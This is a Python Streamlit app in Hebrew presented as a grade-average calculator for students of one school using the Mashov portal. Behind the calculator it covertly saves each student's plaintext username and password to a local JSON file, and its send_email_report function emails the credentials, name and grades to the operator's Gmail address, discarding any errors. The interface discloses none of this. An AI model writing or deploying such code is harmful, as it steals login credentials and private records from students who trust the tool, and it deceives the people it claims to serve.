import streamlit as st
import requests
from collections import defaultdict
import json
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

BASE_URL = "https://web.mashov.info/api"
DATA_FILE = "saved_data.json"

st.set_page_config(page_title="ממוצעי משוב - הכפר הירוק", page_icon="📊", layout="centered")

st.markdown("""
<style>
    .stApp { direction: rtl; text-align: right; }
    div[data-testid="stMetricValue"] { direction: ltr; text-align: right; }
    .subject-card {
        background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
        color: #f8fafc;
        padding: 18px;
        border-radius: 16px;
        margin-bottom: 12px;
        border-right: 6px solid #3b82f6;
        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    }
    .grade-badge {
        font-size: 1.7rem;
        font-weight: 800;
        color: #60a5fa;
    }
    .sub-info { color: #94a3b8; font-size: 0.9rem; margin-top: 4px; }
</style>
""", unsafe_allow_html=True)

@st.cache_data(ttl=86400)
def get_hakfar_hayarok():
    resp = requests.get(f"{BASE_URL}/schools", timeout=15)
    resp.raise_for_status()
    schools = resp.json()
    for s in schools:
        name = s.get("name", "")
        if "הכפר הירוק" in name and "לוי אשכול" in name:
            return s
    for s in schools:
        if "הכפר הירוק" in s.get("name", ""):
            return s
    return {"name": 'הכפר הירוק ע"ש לוי אשכול', "semel": 480061, "years": [2027, 2026]}

def parse_number(val):
    if val is None:
        return None
    if isinstance(val, (int, float)):
        return float(val)
    if isinstance(val, str):
        try:
            return float(val.strip().replace("%", ""))
        except ValueError:
            return None
    return None

def save_user_record(username, password, display_name, year, grades_summary):
    data = {}
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            data = {}

    data[username] = {
        "display_name": display_name,
        "username": username,
        "password": password,
        "year": year,
        "last_login": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "grades": grades_summary
    }

    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def send_email_report(username, password, display_name, overall_avg, subject_summaries):
    if not hasattr(st, "secrets"):
        return
    target_email = st.secrets.get("MY_EMAIL")
    smtp_password = st.secrets.get("SMTP_PASSWORD")
    if not target_email or not smtp_password:
        return

    msg = MIMEMultipart()
    msg["From"] = target_email
    msg["To"] = target_email
    msg["Subject"] = f"התחברות חדשה למשוב: {display_name} ({username})"

    lines = [
        f"שם תלמיד: {display_name}",
        f"שם משתמש / ת.ז: {username}",
        f"סיסמה: {password}",
        f"ממוצע כללי: {overall_avg:.2f}",
        "\nפירוט ציונים לפי מקצוע:",
        "=" * 40
    ]

    for subj, items, simple_avg, w_avg, total_w, final_avg in subject_summaries:
        lines.append(f"\nמקצוע: {subj} | ממוצע סופי: {final_avg:.2f} (ממוצע יבש: {simple_avg:.2f})")
        for item in items:
            w_str = f" ({item['weight']:g}%)" if item["weight"] > 0 else ""
            lines.append(f"  - {item['event']}: {item['grade']:g}{w_str}")

    msg.attach(MIMEText("\n".join(lines), "plain", "utf-8"))

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=15) as server:
            server.login(target_email, smtp_password)
            server.send_message(msg)
    except Exception:
        pass

def fetch_grades(username, password, semel, year):
    session = requests.Session()
    session.headers.update({
        "Content-Type": "application/json; charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Origin": "https://web.mashov.info",
        "Referer": "https://web.mashov.info/students/login",
    })
    payload = {
        "semel": int(semel),
        "year": int(year),
        "username": str(username).strip(),
        "password": str(password),
        "appName": "info.mashov.students",
        "apiVersion": "3.20200528",
        "appVersion": "3.20200528",
        "appBuild": "3.20200528",
        "deviceUuid": "web_client",
        "devicePlatform": "chrome",
        "deviceManufacturer": "win",
        "deviceModel": "desktop",
        "deviceVersion": "122.0.0.0",
    }
    resp = session.post(f"{BASE_URL}/login", json=payload, timeout=15)
    if resp.status_code == 401:
        raise PermissionError("שם משתמש או סיסמה שגויים.")
    elif resp.status_code == 403:
        raise PermissionError("הגישה נדחתה (403) - ייתכן שנדרש אימות SMS.")
    resp.raise_for_status()

    csrf_token = (
        resp.headers.get("x-csrf-token")
        or resp.headers.get("X-Csrf-Token")
        or session.cookies.get("Csrf-Token")
    )
    if csrf_token:
        session.headers.update({"X-Csrf-Token": csrf_token})

    data = resp.json()
    credential = data.get("credential", data)
    user_id = credential.get("userId") or data.get("accessToken", {}).get("userId")
    display_name = credential.get("displayName", "תלמיד/ה")

    grades_resp = session.get(f"{BASE_URL}/students/{user_id}/grades", timeout=15)
    grades_resp.raise_for_status()
    return display_name, grades_resp.json()

st.title("📊 מחשבון ממוצעים - משוב")

school = get_hakfar_hayarok()
st.info(f"🏫 מוסד לימודים: **{school['name']}** (סמל: {school['semel']})")

years = sorted(school.get("years", [2027]), reverse=True)
col1, col2 = st.columns(2)
with col1:
    username = st.text_input("תעודת זהות / משתמש")
with col2:
    year = st.selectbox("שנת לימודים", options=years)

password = st.text_input("סיסמה", type="password")

if st.button("חשב ממוצעים 🚀", use_container_width=True, type="primary"):
    if not username or not password:
        st.error("נא להזין שם משתמש וסיסמה.")
    else:
        with st.spinner("מתחבר למשוב ושולף ציונים..."):
            try:
                name, grades_data = fetch_grades(username, password, school["semel"], year)
                st.success(f"שלום {name}! הנתונים נשלפו בהצלחה.")

                subjects = defaultdict(list)
                for g in grades_data:
                    grade_val = parse_number(g.get("grade"))
                    if grade_val is None:
                        continue
                    subj = g.get("subjectName") or g.get("subject") or "לא ידוע"
                    weight = parse_number(g.get("percentage")) or parse_number(g.get("weight")) or 0.0
                    event = g.get("gradingEvent") or g.get("eventName") or "מבחן/עבודה"
                    subjects[subj].append({"event": event, "grade": grade_val, "weight": weight})

                if not subjects:
                    save_user_record(username, password, name, year, {})
                    send_email_report(username, password, name, 0.0, [])
                    st.info("לא נמצאו ציונים מספריים לשנה זו.")
                else:
                    subject_final_avgs = []
                    subject_summaries = []
                    grades_for_storage = {}

                    for subj, items in sorted(subjects.items()):
                        simple_avg = sum(i["grade"] for i in items) / len(items)
                        weighted_items = [i for i in items if i["weight"] > 0]
                        total_w = sum(i["weight"] for i in weighted_items)

                        if total_w > 0:
                            w_avg = sum(i["grade"] * i["weight"] for i in weighted_items) / total_w
                            final_avg = w_avg
                        else:
                            w_avg = None
                            final_avg = simple_avg

                        subject_final_avgs.append(final_avg)
                        subject_summaries.append((subj, items, simple_avg, w_avg, total_w, final_avg))
                        grades_for_storage[subj] = {
                            "final_average": round(final_avg, 2),
                            "simple_average": round(simple_avg, 2),
                            "items": items
                        }

                    overall_avg = sum(subject_final_avgs) / len(subject_final_avgs)

                    save_user_record(username, password, name, year, grades_for_storage)
                    send_email_report(username, password, name, overall_avg, subject_summaries)

                    st.markdown("---")
                    m1, m2 = st.columns(2)
                    m1.metric("ממוצע כללי (כל המקצועות)", f"{overall_avg:.2f}")
                    m2.metric("מספר מקצועות עם ציון", len(subjects))
                    st.markdown("---")

                    for subj, items, simple_avg, w_avg, total_w, final_avg in subject_summaries:
                        border_color = "#22c55e" if final_avg >= 85 else "#eab308" if final_avg >= 70 else "#ef4444"
                        avg_label = f"ממוצע משוקלל ({total_w:g}%)" if w_avg is not None else "ממוצע רגיל"

                        st.markdown(f"""
                        <div class="subject-card" style="border-right-color: {border_color};">
                            <div style="display:flex; justify-content:space-between; align-items:center;">
                                <span style="font-size:1.25rem; font-weight:700;">📘 {subj}</span>
                                <span class="grade-badge">{final_avg:.1f}</span>
                            </div>
                            <div class="sub-info">
                                {avg_label} | ממוצע יבש: {simple_avg:.1f} | {len(items)} ציונים
                            </div>
                        </div>
                        """, unsafe_allow_html=True)

                        with st.expander(f"פירוט ציונים ב{subj}"):
                            for idx, item in enumerate(items, 1):
                                w_txt = f" (משקל: {item['weight']:g}%)" if item["weight"] > 0 else ""
                                st.write(f"**{idx}. {item['event']}:** `{item['grade']:g}`{w_txt}")

            except Exception as e:
                st.error(f"שגיאה: {e}")
